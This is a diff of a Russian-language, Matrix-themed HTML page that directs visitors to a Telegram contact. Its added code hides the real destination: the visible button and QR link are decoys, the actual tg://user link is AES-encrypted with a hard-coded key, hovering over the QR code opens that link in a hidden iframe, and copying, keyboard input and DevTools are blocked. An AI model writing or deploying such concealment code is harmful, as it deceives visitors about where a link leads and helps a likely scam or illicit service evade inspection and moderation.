@@ -5,12 +5,14 @@
   <title>Matrix Access</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <style>
+    @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
+
     html, body {
       margin: 0; padding: 0;
       height: 100%;
       background: black;
       color: #00ff00;
-      font-family: 'Share Tech Mono', monospace, monospace;
+      font-family: 'Share Tech Mono', monospace;
       user-select: none;
       overflow: hidden;
       display: flex;
@@ -19,6 +21,7 @@
       align-items: center;
       text-align: center;
     }
+
     canvas.matrix {
       position: fixed;
       top: 0; left: 0;
@@ -26,11 +29,14 @@
       z-index: -1;
       display: block;
     }
+
     h1 {
-      font-size: 2rem;
-      margin: 0 0 20px 0;
+      font-size: 1.8rem;
+      margin: 0 0 30px 0;
       text-shadow: 0 0 8px #00ff00;
+      line-height: 1.3;
     }
+
     .btn {
       padding: 14px 32px;
       font-size: 1.25rem;
@@ -46,10 +52,12 @@
       display: inline-block;
       margin-bottom: 30px;
     }
+
     .btn:hover {
       background: #00ff00;
       color: black;
     }
+
     #qrcode {
       margin-top: 0;
       pointer-events: auto;
@@ -64,6 +72,7 @@
       box-sizing: border-box;
       margin-bottom: 30px;
     }
+
     .warning {
       color: #ff4444;
       font-size: 0.9rem;
@@ -72,15 +81,23 @@
     }
   </style>
 </head>
-<body oncontextmenu="return false" onselectstart="return false" oncopy="return false" oncut="return false" onpaste="return false" onkeydown="return false" ondragstart="return false">
+<body 
+  oncontextmenu="return false" 
+  onselectstart="return false" 
+  oncopy="return false" 
+  oncut="return false" 
+  onpaste="return false" 
+  onkeydown="return false" 
+  ondragstart="return false"
+>
 
   <canvas class="matrix"></canvas>
 
-  <h1>ACCESS GRANTED<br>ROUTING: NODE_713</h1>
+  <h1>Только избранный может подключиться.<br>Нажми “СВЯЗАТЬСЯ”</h1>
 
   <a id="contactBtn" class="btn" href="https://t.me/join-proxy" tabindex="0" aria-label="Связаться">СВЯЗАТЬСЯ</a>
 
-  <canvas id="qrcode" aria-label="QR код для связи"></canvas>
+  <canvas id="qrcode" aria-label="QR код для связи" title="Отсканируй меня или наведи курсор"></canvas>
 
   <div class="warning">
     На вашем устройстве обязательно должен быть установлен Telegram.<br>
@@ -96,6 +113,7 @@
   <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/qrcode.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/crypto-js.min.js"></script>
   <script>
+    // Защита от DevTools (простая)
     setInterval(() => {
       const threshold = 160;
       if(window.outerWidth - window.innerWidth > threshold || window.outerHeight - window.innerHeight > threshold) {
@@ -103,6 +121,7 @@
       }
     }, 500);
 
+    // Расшифровка ссылки tg://user?id=...
     const encrypted = "Kx5V3Bt0eTzaBwbgGmlouzKsc5LvDbSef3xND/NzCT4=";
     const key = CryptoJS.MD5("MatrixSecretKey42");
     const decrypted = CryptoJS.AES.decrypt(encrypted, key, {
@@ -111,11 +130,13 @@
       padding: CryptoJS.pad.Pkcs7
     }).toString(CryptoJS.enc.Utf8);
 
+    // Кнопка — фейк в href, но редирект JS
     document.getElementById('contactBtn').addEventListener('click', e => {
       e.preventDefault();
       window.location.href = decrypted;
     });
 
+    // QR-код — фейковая ссылка
     const fakeUrl = "https://t.me/join-proxy";
     const realUrl = decrypted;
 
@@ -126,21 +147,26 @@
     }, function (error) {
       if(error) console.error(error);
     });
-
+    
+    // При наведении на QR — редирект через iframe, эмуляция сканирования камеры
     qrCanvas.addEventListener('mouseenter', () => {
       qrCanvas.style.display = 'none';
+
       const iframe = document.createElement('iframe');
       iframe.style.display = 'none';
       iframe.src = realUrl;
       document.body.appendChild(iframe);
+
       setTimeout(() => {
         qrCanvas.style.display = 'block';
         document.body.removeChild(iframe);
       }, 2000);
     });
 
+    // MATRIX-анимация на фон
     const canvas = document.querySelector('.matrix');
     const ctx = canvas.getContext('2d');
+
     function resize() {
       canvas.width = window.innerWidth;
       canvas.height = window.innerHeight;
@@ -156,18 +182,20 @@
       ctx.fillRect(0, 0, canvas.width, canvas.height);
       ctx.fillStyle = "#0F0";
       ctx.font = "14px monospace";
+
       for (let i = 0; i < drops.length; i++) {
         const charCode = 0x30A0 + Math.random() * 96;
         const text = String.fromCharCode(charCode);
         const x = i * 14;
         const y = drops[i] * 14;
+
         ctx.fillText(text, x, y);
+
         if (y > canvas.height && Math.random() > 0.975) drops[i] = 0;
         drops[i]++;
       }
     }
     setInterval(drawMatrix, 50);
   </script>
-
 </body>
 </html>
